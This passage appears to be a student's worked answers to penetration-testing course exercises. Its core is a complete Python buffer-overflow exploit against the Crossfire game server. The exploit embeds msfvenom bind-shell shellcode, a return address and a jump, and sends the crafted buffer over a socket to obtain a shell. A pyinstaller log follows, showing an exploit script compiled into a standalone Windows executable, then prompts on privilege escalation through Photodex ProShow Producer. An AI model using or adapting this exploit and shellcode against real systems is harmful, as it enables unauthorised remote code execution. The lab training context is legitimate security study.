2. Identify what characters you cannot use as part of your payload.
\x00\x0a\x0d\x20


### 8.8.1 - Exercise

1. Update your proof of concept and obtain a shell from Crossfire.

```Python
#!/usr/bin/python
import socket

host = "127.0.0.1"

# msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c -b "\x00\x0a\x0d\x20" -e x86/shikata_ga_nai
shellcode = (
"\xb8\x88\x9f\x16\x7a\xdb\xdf\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x14\x31\x43\x14\x83\xeb\xfc\x03\x43\x10\x6a\x6a\x27\xa1\x9d"
"\x76\x1b\x16\x32\x13\x9e\x11\x55\x53\xf8\xec\x15\xcf\x5b\xbd"
"\x7d\xf2\x63\x50\x21\x98\x73\x03\x89\xd5\x95\xc9\x4f\xbe\x98"
"\x8e\x06\x7f\x27\x3c\x1c\x30\x41\x8f\x9c\x73\x3e\x69\x51\xf3"
"\xad\x2f\x03\xcb\x89\x02\x53\x7a\x53\x65\x3b\x52\x8c\xe6\xd3"
"\xc4\xfd\x6a\x4a\x7b\x8b\x88\xdc\xd0\x02\xaf\x6c\xdd\xd9\xb0"
)

crash = shellcode + "\x41" * (4368-105) + "\x97\x45\x13\x08" + "\x83\xc0\x0c\xff\xe0\x90\x90"

buffer = "\x11(setup sound " + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host, 13327))
data=s.recv(1024)
print data
s.send(buffer)
s.close()
print "[*]Payload Sent !"
```


### 11.2.3 - Exercises
1. Use pyinstaller to compile a Python exploit into a standalone .exe.
```
C:\Users\Administrator\Desktop\Tools\python\pyinstaller-2.1\pyInstaller-2.1>pyth
on pyinstaller.py --onefile C:\Users\Offsec\Desktop\34272.py
266 INFO: wrote C:\Users\Administrator\Desktop\Tools\python\pyinstaller-2.1\pyIn
staller-2.1\34272\34272.spec
312 INFO: Testing for ability to set icons, version resources...
390 INFO: ... resource update available
390 INFO: UPX is not available.
453 INFO: Processing hook hook-os
578 INFO: Processing hook hook-time
593 INFO: Processing hook hook-cPickle
671 INFO: Processing hook hook-_sre
796 INFO: Processing hook hook-cStringIO
904 INFO: Processing hook hook-encodings
936 INFO: Processing hook hook-codecs
1279 INFO: Extending PYTHONPATH with C:\Users\Offsec\Desktop
1279 INFO: checking Analysis
1279 INFO: building Analysis because out00-Analysis.toc non existent
1279 INFO: running Analysis out00-Analysis.toc
1279 INFO: Adding Microsoft.VC90.CRT to dependent assemblies of final executable

1311 INFO: Searching for assembly x86_Microsoft.VC90.CRT_1fc8b3b9a1e18e3b_9.0.21
022.8_none ...
1311 INFO: Found manifest C:\Windows\WinSxS\Manifests\x86_microsoft.vc90.crt_1fc
8b3b9a1e18e3b_9.0.21022.8_none_bcb86ed6ac711f91.manifest
1311 INFO: Searching for file msvcr90.dll
1311 INFO: Found file C:\Windows\WinSxS\x86_microsoft.vc90.crt_1fc8b3b9a1e18e3b_
9.0.21022.8_none_bcb86ed6ac711f91\msvcr90.dll
1311 INFO: Searching for file msvcp90.dll
1311 INFO: Found file C:\Windows\WinSxS\x86_microsoft.vc90.crt_1fc8b3b9a1e18e3b_
9.0.21022.8_none_bcb86ed6ac711f91\msvcp90.dll
1325 INFO: Searching for file msvcm90.dll
1325 INFO: Found file C:\Windows\WinSxS\x86_microsoft.vc90.crt_1fc8b3b9a1e18e3b_
9.0.21022.8_none_bcb86ed6ac711f91\msvcm90.dll
1404 INFO: Analyzing C:\Users\Administrator\Desktop\Tools\python\pyinstaller-2.1
\pyInstaller-2.1\PyInstaller\loader\_pyi_bootstrap.py
1436 INFO: Processing hook hook-os
1467 INFO: Processing hook hook-site
1482 INFO: Processing hook hook-encodings
1592 INFO: Processing hook hook-time
1592 INFO: Processing hook hook-cPickle
1654 INFO: Processing hook hook-_sre
1748 INFO: Processing hook hook-cStringIO
1825 INFO: Processing hook hook-codecs
2246 INFO: Processing hook hook-pydoc
2371 INFO: Processing hook hook-email
2450 INFO: Processing hook hook-httplib
2496 INFO: Processing hook hook-email.message
2559 INFO: Analyzing C:\Users\Administrator\Desktop\Tools\python\pyinstaller-2.1
\pyInstaller-2.1\PyInstaller\loader\pyi_importers.py
2621 INFO: Analyzing C:\Users\Administrator\Desktop\Tools\python\pyinstaller-2.1
\pyInstaller-2.1\PyInstaller\loader\pyi_archive.py
2652 INFO: Analyzing C:\Users\Administrator\Desktop\Tools\python\pyinstaller-2.1
\pyInstaller-2.1\PyInstaller\loader\pyi_carchive.py
2715 INFO: Analyzing C:\Users\Administrator\Desktop\Tools\python\pyinstaller-2.1
\pyInstaller-2.1\PyInstaller\loader\pyi_os_path.py
2730 INFO: Analyzing C:\Users\Offsec\Desktop\34272.py
2792 INFO: Hidden import 'codecs' has been found otherwise
2792 INFO: Hidden import 'encodings' has been found otherwise
2792 INFO: Looking for run-time hooks
2996 INFO: Using Python library C:\Windows\system32\python27.dll
3074 INFO: Warnings written to C:\Users\Administrator\Desktop\Tools\python\pyins
taller-2.1\pyInstaller-2.1\34272\build\34272\warn34272.txt
3088 INFO: checking PYZ
3088 INFO: rebuilding out00-PYZ.toc because out00-PYZ.pyz is missing
3088 INFO: building PYZ (ZlibArchive) out00-PYZ.toc
3822 INFO: checking PKG
3822 INFO: rebuilding out00-PKG.toc because out00-PKG.pkg is missing
3822 INFO: building PKG (CArchive) out00-PKG.pkg
5008 INFO: checking EXE
5008 INFO: rebuilding out00-EXE.toc because 34272.exe missing
5008 INFO: building EXE from out00-EXE.toc
5024 INFO: Appending archive to EXE C:\Users\Administrator\Desktop\Tools\python\
pyinstaller-2.1\pyInstaller-2.1\34272\dist\34272.exe

```


2. Install Photodex ProShow Producer on your Windows host. Escalate privileges
from a standard user account.
3. Can you find additional ways of escalating permissions, outside of what is
described in the course?
